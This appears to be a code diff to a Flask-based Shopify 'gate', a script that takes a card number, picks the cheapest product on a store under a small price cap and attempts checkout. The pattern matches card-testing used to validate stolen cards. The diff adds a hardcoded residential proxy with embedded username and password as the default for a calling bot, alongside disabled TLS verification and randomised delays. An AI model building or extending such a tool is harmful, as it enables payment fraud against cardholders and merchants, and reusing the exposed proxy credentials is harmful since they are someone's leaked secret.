@@ -9,6 +9,8 @@ app = Flask(__name__)
 
 TIMEOUT = 30
 MAX_PRICE = 15.0
+# البروكسي الافتراضي للفحص إذا لم يرسل البوت بروكسي
+DEFAULT_PROXY = 'http://qsolm8bxa0-pool-mobile.res.corp-country-US-state-4736286-mode-query-tier-premium-quality-static:mpepvribxuihnXpA@190.2.143.20:9999'
 
 def format_proxy(proxy_str):
     if not proxy_str:
@@ -26,14 +28,15 @@ def format_proxy(proxy_str):
             return f"{ip}:{port}@{user}:{pwd}"
     return p
 
-def get_proxies_dict(proxy_str):
-    if not proxy_str:
-        return None
-    fmt = format_proxy(proxy_str)
-    if not fmt:
-        return None
-    url = f"http://{fmt}"
-    return {"http": url, "https": url}
+def get_proxies_dict(proxy_str=None):
+    if proxy_str:
+        fmt = format_proxy(proxy_str)
+        if fmt:
+            url = f"http://{fmt}"
+            return {"http": url, "https": url}
+    
+    # إذا لم يرسل البوت بروكسي، استخدم البروكسي الافتراضي
+    return {"http": DEFAULT_PROXY, "https": DEFAULT_PROXY}
 
 def get_shopify_product(site, proxy_dict):
     try:
@@ -41,9 +44,14 @@ def get_shopify_product(site, proxy_dict):
             site = f'https://{site}'
         url = f"{site.rstrip('/')}/products.json"
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-        resp = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10, verify=False)
+        resp = requests.get(url, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
+        
         if resp.status_code == 200:
-            data = resp.json()
+            try:
+                data = resp.json()
+            except:
+                return None
+                
             variants = []
             for prod in data.get('products', []):
                 for var in prod.get('variants', []):
@@ -55,8 +63,8 @@ def get_shopify_product(site, proxy_dict):
                         })
             if variants:
                 return min(variants, key=lambda x: x['price'])
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Error fetching {site}: {e}")
     return None
 
 def shopify_checkout(site, cc, proxy_dict):
@@ -87,7 +95,7 @@ def shopify_checkout(site, cc, proxy_dict):
         if r.status_code not in [200, 201]:
             return {"Response": "Cart Add Failed", "Price": price_str, "Gate": "Shopify"}
     except Exception as e:
-        return {"Response": f"Connection Error: {str(e)}", "Price": price_str, "Gate": "Shopify"}
+        return {"Response": f"Connection Error", "Price": price_str, "Gate": "Shopify"}
 
     time.sleep(random.uniform(1, 3))
     
